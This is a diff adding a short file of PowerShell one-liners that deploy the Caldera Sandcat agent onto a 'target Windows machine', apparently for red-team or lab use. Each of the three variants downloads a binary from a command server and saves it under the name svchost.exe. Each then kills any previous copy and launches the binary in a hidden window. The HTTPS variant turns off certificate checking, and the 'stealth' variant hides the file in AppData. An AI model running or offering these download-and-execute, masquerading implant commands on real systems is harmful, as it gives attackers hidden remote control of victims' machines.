@@ -1,0 +1,11 @@
+# Caldera Sandcat - One-Liner Deployment (svchost.exe)
+# Copy and paste this into PowerShell on target Windows machine
+
+# Standard deployment
+$server="http://192.168.124.133:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\svchost.exe"} | stop-process -f;rm -force "C:\Users\Public\svchost.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\svchost.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\svchost.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+# Alternative: Use HTTPS (if server has SSL)
+$server="https://192.168.124.133";$url="$server/file/download";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\svchost.exe"} | stop-process -f;rm -force "C:\Users\Public\svchost.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\svchost.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\svchost.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+# Stealth version: Uses AppData instead of Public folder
+$server="http://192.168.124.133:8888";$url="$server/file/download";$path="$env:APPDATA\Microsoft\Windows\svchost.exe";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like $path} | stop-process -f;rm -force $path -ea ignore;New-Item -ItemType Directory -Force -Path "$env:APPDATA\Microsoft\Windows" | Out-Null;[io.file]::WriteAllBytes($path,$data) | Out-Null;Start-Process -FilePath $path -ArgumentList "-server $server -group red" -WindowStyle hidden;
